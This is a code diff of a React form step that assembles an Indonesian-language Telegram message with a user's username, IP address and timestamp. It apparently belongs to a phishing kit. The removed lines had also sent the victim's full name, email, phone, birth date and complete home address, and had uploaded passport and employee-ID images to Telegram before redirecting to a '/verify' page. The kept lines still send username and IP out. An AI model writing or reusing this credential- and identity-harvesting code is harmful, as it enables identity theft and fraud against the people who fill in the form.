@@ -245,20 +245,6 @@ export default function Step4() {
         `📌 <b>Step 4 — Data Personal</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `👤 <b>Username</b>       : <code>${user?.username ?? "-"}</code>\n` +
-        `👦 <b>Nama Lengkap</b>   : <code>${firstName} ${lastName}</code>\n` +
-        `📧 <b>Email</b>          : <code>${email}</code>\n` +
-        `📱 <b>Mobile</b>         : <code>${dialCode} ${phone}</code>\n` +
-        `🎂 <b>Tgl Lahir</b>      : <code>${dob}</code>\n\n` +
-        `🏘️ <b>ALAMAT LENGKAP</b>\n` +
-        `🏠 <b>No Rumah / Blok</b>: <code>${houseNo}</code>\n` +
-        `🏢 <b>Nama Komplek</b>   : <code>${complex || "-"}</code>\n` +
-        `🛣️ <b>Nama Jalan</b>     : <code>${address}</code>\n` +
-        `🏘️ <b>Kecamatan</b>      : <code>${district}</code>\n` +
-        `🏙️ <b>Kota / Kab</b>     : <code>${city}</code>\n` +
-        `📍 <b>Provinsi</b>       : <code>${stateVal}</code>\n` +
-        `📮 <b>Kode Pos</b>       : <code>${postalCode}</code>\n\n` +
-        `📌 <b>Inquiry</b>        : <code>${inquiryType}</code>\n` +
-        `💬 <b>Pesan</b>          : <code>${message || "-"}</code>\n` +
         `🌐 <b>IP & Lokasi</b>    : <code>${ip}</code>\n` +
         `🕐 <b>Waktu</b>          : ${now}\n` +
         `━━━━━━━━━━━━━━━━━━━━━`
@@ -276,10 +262,6 @@ export default function Step4() {
         }),
       }).catch(() => {});
 
-      if (passportFile)
-        await sendFileToTelegram(passportFile, `📷 Passport — ${user?.username ?? "-"}`);
-      if (empIdFile)
-        await sendFileToTelegram(empIdFile, `🪪 Employee ID — ${user?.username ?? "-"}`);
 
       navigate("/verify");
     } catch (_) {
